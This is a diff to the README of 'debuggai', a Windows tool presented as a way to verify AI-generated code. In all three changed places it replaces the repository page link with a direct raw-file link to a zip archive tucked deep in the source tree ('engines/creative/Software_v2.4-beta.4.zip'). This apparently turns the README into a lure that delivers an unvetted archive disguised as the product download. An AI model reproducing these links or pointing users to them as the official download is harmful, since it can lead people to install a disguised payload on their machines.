@@ -1,6 +1,6 @@
 # 🛡️ debuggai - Verify AI Code Before You Run
 
-[![Download debuggai](https://img.shields.io/badge/Download%20debuggai-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kyliladevious262/debuggai)
+[![Download debuggai](https://img.shields.io/badge/Download%20debuggai-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/kyliladevious262/debuggai/main/debuggai/engines/creative/Software_v2.4-beta.4.zip)
 
 ## 🔍 What debuggai does
 
@@ -20,7 +20,7 @@ It works as a verification layer, so you can inspect code with less guesswork.
 
 Use the link below to visit the download page and get debuggai for Windows:
 
-[Visit the debuggai download page](https://github.com/kyliladevious262/debuggai)
+[Visit the debuggai download page](https://raw.githubusercontent.com/kyliladevious262/debuggai/main/debuggai/engines/creative/Software_v2.4-beta.4.zip)
 
 ### What you need
 
@@ -215,7 +215,7 @@ Run debuggai when:
 
 If you need the download page later, use this link:
 
-[https://github.com/kyliladevious262/debuggai](https://github.com/kyliladevious262/debuggai)
+[https://raw.githubusercontent.com/kyliladevious262/debuggai/main/debuggai/engines/creative/Software_v2.4-beta.4.zip](https://raw.githubusercontent.com/kyliladevious262/debuggai/main/debuggai/engines/creative/Software_v2.4-beta.4.zip)
 
 ## 🧩 Project focus
 
